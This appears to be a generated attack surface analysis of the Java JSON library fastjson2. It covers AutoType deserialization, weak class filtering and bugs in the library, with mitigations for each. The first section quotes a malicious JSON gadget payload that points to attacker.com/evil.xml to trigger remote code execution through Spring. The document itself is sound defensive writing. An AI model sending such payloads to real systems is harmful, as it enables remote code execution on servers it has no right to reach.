# Attack Surface Analysis for alibaba/fastjson2

## Attack Surface: [Deserialization of Untrusted Data via `AutoType`](./attack_surfaces/deserialization_of_untrusted_data_via__autotype_.md)

*   **Description:**  `fastjson2`'s `AutoType` feature allows the deserialization of arbitrary Java classes from JSON input based on the `@type` field. This can lead to the instantiation of dangerous classes.
    *   **How fastjson2 Contributes:**  `fastjson2` provides this functionality, and if enabled without proper restrictions, it allows attackers to control the class instantiation process.
    *   **Example:**  A malicious JSON payload like `{"@type":"org.springframework.context.support.FileSystemXmlApplicationContext", "configLocation":"http://attacker.com/evil.xml"}` could be used to trigger remote code execution if Spring Framework is in the classpath.
    *   **Impact:**  Remote Code Execution (RCE), Denial of Service (DoS), data exfiltration, or other arbitrary code execution depending on the instantiated class.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   Disable `AutoType` globally if not absolutely necessary.
        *   Implement strict whitelisting of allowed classes for deserialization if `AutoType` is required.
        *   Avoid deserializing data from untrusted sources.
        *   Sanitize and validate input before deserialization.

## Attack Surface: [Configuration Allowing Deserialization of Dangerous Classes](./attack_surfaces/configuration_allowing_deserialization_of_dangerous_classes.md)

*   **Description:** Even with some `AutoType` restrictions, misconfiguration might allow the deserialization of specific known vulnerable classes or classes that can be used as gadgets for exploitation.
    *   **How fastjson2 Contributes:** `fastjson2`'s configuration options determine which classes are allowed or blocked during deserialization when `AutoType` is enabled.
    *   **Example:**  Even with a partial blacklist, attackers might find alternative gadget classes within the classpath that can be exploited.
    *   **Impact:**  Remote Code Execution (RCE), Denial of Service (DoS), or other unintended consequences.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Implement a robust whitelist instead of relying solely on blacklists.
        *   Regularly review and audit `fastjson2` configuration settings.
        *   Follow security best practices for dependency management and keep all libraries updated.

## Attack Surface: [Potential Vulnerabilities within `fastjson2` Itself](./attack_surfaces/potential_vulnerabilities_within__fastjson2__itself.md)

*   **Description:** Like any software library, `fastjson2` might contain its own bugs or vulnerabilities that could be exploited.
    *   **How fastjson2 Contributes:**  The inherent complexity of the library's parsing and deserialization logic can lead to unforeseen vulnerabilities.
    *   **Example:** A parsing vulnerability could allow an attacker to craft a specific JSON payload that crashes the application or causes unexpected behavior within `fastjson2`.
    *   **Impact:**  Varies depending on the nature of the vulnerability, potentially leading to RCE, DoS, or data corruption.
    *   **Risk Severity:** Varies (can be Critical or High depending on the specific vulnerability)
    *   **Mitigation Strategies:**
        *   Keep `fastjson2` updated to the latest version to patch known vulnerabilities.
        *   Monitor security advisories and vulnerability databases for any reported issues with `fastjson2`.
